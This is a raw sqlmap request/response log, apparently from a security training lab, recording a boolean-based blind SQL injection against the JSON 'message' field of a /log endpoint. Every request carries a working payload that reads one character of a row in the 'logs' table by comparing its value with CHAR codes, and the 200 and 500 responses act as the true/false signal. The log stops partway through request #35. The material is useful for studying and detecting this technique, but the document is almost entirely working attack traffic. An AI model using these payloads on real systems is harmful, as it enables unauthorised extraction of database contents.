@@ -1,0 +1,5876 @@
+HTTP request [#1]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 18
+Connection: close
+
+{"message":"test"}
+
+HTTP response [#1] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:19:57 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#2]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),6,1)>CHAR(65))||'"}
+
+HTTP response [#2] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:19:57 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#3]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),6,1)>CHAR(96))||'"}
+
+HTTP response [#3] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:19:58 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#4]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),6,1)>CHAR(112))||'"}
+
+HTTP response [#4] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:19:59 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#5]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),6,1)>CHAR(104))||'"}
+
+HTTP response [#5] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:19:59 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#6]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),6,1)>CHAR(100))||'"}
+
+HTTP response [#6] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:19:59 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#7]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),6,1)>CHAR(98))||'"}
+
+HTTP response [#7] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:00 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#8]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),6,1)>CHAR(99))||'"}
+
+HTTP response [#8] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:00 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#9]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),7,1)>CHAR(96))||'"}
+
+HTTP response [#9] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:00 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#10]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),7,1)>CHAR(49))||'"}
+
+HTTP response [#10] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:01 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#11]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),7,1)>CHAR(72))||'"}
+
+HTTP response [#11] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:01 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#12]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),7,1)>CHAR(60))||'"}
+
+HTTP response [#12] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#13]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),7,1)>CHAR(54))||'"}
+
+HTTP response [#13] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#14]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),7,1)>CHAR(51))||'"}
+
+HTTP response [#14] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#15]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),7,1)>CHAR(50))||'"}
+
+HTTP response [#15] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:02 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#16]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(47))||'"}
+
+HTTP response [#16] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:03 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#17]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(87))||'"}
+
+HTTP response [#17] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:03 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#18]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(67))||'"}
+
+HTTP response [#18] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:03 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#19]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(57))||'"}
+
+HTTP response [#19] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:04 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#20]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(52))||'"}
+
+HTTP response [#20] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:04 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#21]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(49))||'"}
+
+HTTP response [#21] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:04 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#22]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(50))||'"}
+
+HTTP response [#22] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:05 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#23]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),8,1)>CHAR(51))||'"}
+
+HTTP response [#23] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:05 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#24]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),9,1)>CHAR(47))||'"}
+
+HTTP response [#24] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:06 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#25]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),9,1)>CHAR(87))||'"}
+
+HTTP response [#25] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:06 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#26]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),9,1)>CHAR(67))||'"}
+
+HTTP response [#26] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:06 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#27]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),9,1)>CHAR(57))||'"}
+
+HTTP response [#27] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:06 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#28]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),9,1)>CHAR(52))||'"}
+
+HTTP response [#28] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:07 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#29]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),9,1)>CHAR(54))||'"}
+
+HTTP response [#29] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:07 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#30]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 164
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),9,1)>CHAR(53))||'"}
+
+HTTP response [#30] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:08 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#31]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(47))||'"}
+
+HTTP response [#31] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:08 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#32]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(87))||'"}
+
+HTTP response [#32] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:09 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#33]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(67))||'"}
+
+HTTP response [#33] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:09 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#34]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(57))||'"}
+
+HTTP response [#34] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:09 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#35]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
